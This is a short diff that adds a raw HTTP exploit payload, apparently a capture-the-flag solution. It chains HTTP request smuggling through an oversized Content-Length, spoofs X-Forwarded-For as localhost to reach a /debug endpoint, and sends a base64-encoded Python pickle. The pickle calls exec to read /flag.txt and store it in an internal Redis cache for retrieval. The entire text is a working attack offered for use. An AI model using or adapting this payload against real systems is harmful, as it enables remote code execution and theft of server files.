@@ -1,0 +1,10 @@
+GET / HTTP/1.1
+Host: localhost
+Cash-Encoding: Money!
+Content-Length: 999999
+
+					 nan DOLLARS
+GET /debug?uid=ba00a33c-b023-42ce-b2ee-2a6c152e1a62&data=gASV8gAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIzWCmltcG9ydCByZWRpcwpyID0gcmVkaXMuUmVkaXMoaG9zdD0nY2FjaGUtc3RvcmFnZScsIHBvcnQ9NjM3OSwgZW5jb2Rpbmc9J3V0Zi04JywgZGVjb2RlX3Jlc3BvbnNlcz1UcnVlKQp0cnk6CiAgICBkYXRhID0gb3BlbignL2ZsYWcudHh0JywncicpLnJlYWQoKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBkYXRhID0gZidFUlI6e2V9JwpyLnNldCgnbGVhaycsIGRhdGEpCpSFlFKULg%3D%3D HTTP/1.1
+Host: backend
+X-Forwarded-For: 8.8.8.8, 127.0.0.1
+
